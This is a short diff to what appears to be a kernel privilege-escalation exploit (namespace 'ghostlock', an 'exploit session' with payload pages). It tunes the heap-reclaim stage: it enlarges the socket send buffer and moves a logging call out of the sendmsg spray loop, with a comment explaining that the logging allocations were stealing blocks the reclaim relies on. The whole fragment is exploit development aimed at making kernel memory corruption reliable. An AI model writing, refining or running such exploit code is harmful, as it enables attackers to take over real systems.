@@ -764,7 +764,7 @@ namespace ghostlock::support {
 
         SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
         session::g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
-        int32_t sndbuf = 1 << 20;
+        int32_t sndbuf = 1 << 23;
         setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
         int32_t reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
         if (reclaim_flags >= 0) {
@@ -828,8 +828,13 @@ namespace ghostlock::support {
         }
         int32_t reclaim_ok = 0;
         int32_t reclaim_errno = 0;
+        /* One fsynced line for the whole loop: the per-send breadcrumb used to
+         * run open+write+fsync+close 8 times between the sends, and every one of
+         * those allocations could take a block out of the free pool this reclaim
+         * depends on. The stage names stay stable for the existing log readers;
+         * only the repetition is gone. */
+        spray_breadcrumb("step6 reclaim-sends");
         for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
-            spray_breadcrumb("step6 reclaim-sends");
             errno = 0;
             ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
             /* A short datagram still queues an skb, but not one that covers the
